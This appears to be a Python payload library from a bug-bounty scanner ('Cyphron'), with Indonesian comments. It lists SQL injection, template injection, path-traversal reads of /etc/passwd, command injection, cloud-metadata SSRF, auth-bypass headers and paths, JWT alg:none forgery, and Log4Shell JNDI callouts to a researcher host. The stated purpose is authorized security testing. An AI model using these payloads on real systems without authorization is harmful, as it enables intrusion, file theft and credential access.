"""payloads — pustaka payload eksploitasi Cyphron, dikelompokkan kelas +
severity. DATA-ONLY (tanpa jaringan).

Filosofi (doktrin Zero-FP + cease-on-data):
  - Payload di sini adalah ALAT PEMBUKTI DAMPAK untuk target yang SUDAH
    terotorisasi (program bounty resmi), bukan senjata mass-exploit.
  - Setiap entri punya: payload, marker bukti yang dicari di respons,
    dan severity DASAR — severity final TETAP ditentukan bukti dampak
    nyata di lapangan (bukan oleh daftar ini).
  - Kategori 'evidence-safe' hanya membuktikan eksekusi/akses dengan
    efek minimal (aritmetika, nama host, 1 baris) — TIDAK mengekstrak
    data user. Dump massal dilarang keras oleh doktrin.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Payload:
    name: str
    payload: str
    evidence: str          # marker bukti yang dicari di respons (case-insensitive)
    severity: str          # low | medium | high | critical (dasar)
    note: str = ""         # konteks pemakaian / batasan


# ---------------------------------------------------------------- SQLi
SQLI_EXTRACT: list[Payload] = [
    # bukti ekstraksi data SQL yang evidence-safe (versi DB, bukan data user)
    Payload("sqli-union-version-mysql",
            "' UNION SELECT @@version,2,3-- -",
            "mysql", "critical",
            "MySQL/MariaDB: versi server membuktikan ekstraksi kolom"),
    Payload("sqli-union-version-mssql",
            "' UNION SELECT @@version,2,3-- -",
            "microsoft sql server", "critical",
            "MSSQL: versi server membuktikan ekstraksi kolom"),
    Payload("sqli-union-version-pg",
            "' UNION SELECT version(),2,3-- -",
            "postgresql", "critical",
            "PostgreSQL: versi server"),
    Payload("sqli-sqlite-version",
            "' UNION SELECT sqlite_version(),2,3-- -",
            "3.", "critical",
            "SQLite: sqlite_version() mengembalikan '3.x'"),
    Payload("sqli-boolean-proof",
            "' OR '1'='1",
            "", "high",
            "Boolean-based: bukti lewat perbedaan respons (bukan marker)"),
]

# ---------------------------------------------------------------- SSTI
SSTI_RCE: list[Payload] = [
    Payload("ssti-jinja2", "{{7*7}}", "49", "critical",
            "Jinja2/Twig: 49 membuktikan evaluasi template = RCE-class"),
    Payload("ssti-twig-a", "{{7*'7'}}", "7777777", "critical",
            "Twig: 7777777 khas Twig (bukan Jinja)"),
    Payload("ssti-java-el", "${7*7}", "49", "critical",
            "Java EL/OGNL family"),
    Payload("ssti-erb", "<%= 7*7 %>", "49", "critical",
            "Ruby ERB"),
    Payload("ssti-smarty", "{7*7}", "49", "critical",
            "Smarty"),
]

# ---------------------------------------------------------------- LFI
LFI_READ: list[Payload] = [
    # cease-on-data: cukup /etc/hostname atau 1 baris pertama /etc/passwd
    Payload("lfi-etc-hostname", "../../../../etc/hostname", "", "high",
            "Hostname container/host — bukti baca file arbitrer"),
    Payload("lfi-etc-passwd", "../../../../etc/passwd", "root:", "high",
            "root:x:0:0 = bukti baca; JANGAN simpan isi penuh (cease-on-data)"),
    Payload("lfi-double-encode", "..%252f..%252f..%252fetc%252fpasswd",
            "root:", "critical",
            "Double-encoding — lolos filter decode tunggal"),
    Payload("lfi-null-byte-legacy", "../../../../etc/passwd%00", "root:", "high",
            "Null byte — hanya runtime lama; sering FP modern"),
    Payload("lfi-php-filter", "php://filter/convert.base64-encode/resource=../../../../etc/hostname",
            "", "critical",
            "PHP filter chain — baca file via wrapper"),
]

# ---------------------------------------------------------------- CMD-INJ
CMD_INJ: list[Payload] = [
    Payload("cmd-hostname-unix", "; hostname", "", "critical",
            "Keluaran hostname = bukti eksekusi perintah (evidence-safe)"),
    Payload("cmd-hostname-win", "& hostname", "", "critical",
            "Windows variant"),
    Payload("cmd-backtick", "`hostname`", "", "critical",
            "Backtick substitution"),
    Payload("cmd-subst", "$(hostname)", "", "critical",
            "Command substitution"),
]

# ---------------------------------------------------------------- SSRF
SSRF_TARGETS: list[Payload] = [
    Payload("ssrf-metadata-aws", "http://169.254.169.254/latest/meta-data/", "",
            "critical",
            "IMDS AWS — pelajaran BINUS: content-blind via pingback TIDAK "
            "di-claim; hanya bila body terbaca"),
    Payload("ssrf-metadata-gcp", "http://metadata.google.internal/computeMetadata/v1/",
            "", "critical",
            "GCP IMDS — butuh header Metadata-Flavor"),
    Payload("ssrf-localhost-probe", "http://127.0.0.1:80/", "", "high",
            "Bukti akses service internal via differential (ukuran/status)"),
]

# ------------------------------------------------------- AUTH-BYPASS HEADERS
AUTH_BYPASS_HEADERS: list[Payload] = [
    # dikirim sebagai HEADER tambahan pada request ke path terproteksi
    Payload("ab-x-original-url", "X-Original-URL: /{path}", "", "high",
            "Proxy/frontend membaca path dari header internal"),
    Payload("ab-x-rewrite-url", "X-Rewrite-URL: /{path}", "", "high",
            "IIS rewrite via header"),
    Payload("ab-xff-localhost", "X-Forwarded-For: 127.0.0.1", "", "medium",
            "ACL berbasis IP lokal"),
    Payload("ab-x-custom-ip", "X-Custom-IP-Authorization: 127.0.0.1", "", "medium",
            "Varian umum middleware"),
    Payload("ab-x-forwarded-host", "X-Forwarded-Host: localhost", "", "medium",
            "Host-based routing bypass"),
]

# ------------------------------------------------------- AUTH-BYPASS PATH VARIANTS
AUTH_BYPASS_PATHS: list[Payload] = [
    Payload("ab-path-double-slash", "//{path}", "", "high",
            "Normalisasi path berbeda antara proxy dan app"),
    Payload("ab-path-trailing", "/{path}/", "", "medium",
            "Trailing slash mismatch"),
    Payload("ab-path-dot-segment", "/./{path}", "", "high",
            "Dot-segment handling mismatch"),
    Payload("ab-path-encoded", "/%2f{path}", "", "high",
            "Encoded slash decode mismatch"),
    Payload("ab-path-semicolon", "/{path};/", "", "high",
            "Semicolon path-param mismatch (Tomcat/Jetty)"),
    Payload("ab-path-dotdot", "/x/../{path}", "", "medium",
            "Dot-dot normalization mismatch"),
]

# ---------------------------------------------------------------- JWT
JWT_EXPLOITS: list[Payload] = [
    Payload("jwt-alg-none", '{"alg":"none","typ":"JWT"}', "", "critical",
            "alg:none — header baru + signature dihapus; server yang tidak "
            "memverifikasi akan menerima. Gunakan token milik sendiri."),
    Payload("jwt-alg-confusion-hs256", '{"alg":"HS256","typ":"JWT"}', "", "critical",
            "RS256->HS256 confusion: sign HS256 dengan public key sebagai "
            "secret. Token milik sendiri."),
]

# ---------------------------------------------------------------- CMD-ARITH
CMD_ARITH: list[Payload] = [
    # bukti eksekusi via aritmetika — marker "2345" hanyalah hasil perhitungan
    # server; differential vs baseline WAJIB (angka 2345 di baseline = bukan bukti)
    Payload("cmd-arith-bash", "; echo $((1234+1111))", "2345", "critical",
            "sh/bash: echo $(( )) dievaluasi server -> 2345"),
    Payload("cmd-arith-cmdexe", "& set /a 1234+1111", "2345", "critical",
            "Windows cmd.exe: set /a menghitung -> 2345"),
    Payload("cmd-arith-backtick", "`expr 1234 + 1111`", "2345", "critical",
            "Unix backtick + expr -> 2345"),
    Payload("cmd-arith-subst", "$(expr 1234 + 1111)", "2345", "critical",
            "Command substitution + expr -> 2345"),
]

# ---------------------------------------------------------------- JNDI
JNDI_PINGBACK: list[Payload] = [
    # {host} diganti host capture OOB milik peneliti di engine (bukan di sini)
    Payload("jndi-ldap", "${jndi:ldap://{host}/j}", "", "critical",
            "Log4Shell klasik: lookup LDAP ke capture peneliti"),
    Payload("jndi-rmi", "${jndi:rmi://{host}/j}", "", "critical",
            "Varian RMI (classpath tanpa LDAP)"),
    Payload("jndi-obfuscated", "${${lower:j}ndi:ldap://{host}/j2}", "", "critical",
            "Obfuscation blocklist naif 'jndi' — menguji parser log4j, "
            "bukan menghindari WAF untuk akses tanpa izin"),
]


def by_severity(items: list[Payload], floor: str) -> list[Payload]:
    order = {"low": 0, "medium": 1, "high": 2, "critical": 3}
    return [p for p in items if order.get(p.severity, 0) >= order.get(floor, 0)]
